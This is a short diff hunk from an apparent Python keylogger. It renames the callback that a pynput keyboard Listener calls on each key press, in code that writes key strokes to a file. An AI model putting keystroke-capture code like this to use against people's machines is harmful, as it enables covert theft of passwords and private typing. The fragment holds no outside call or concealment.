@@ -19,5 +19,5 @@ def write_to_file(key):
         f.write(key_stroke)
 
 
-with Listener(on_press=write_to_file) as letter:
+with Listener(on_press=key_typed) as letter:
     letter.join()
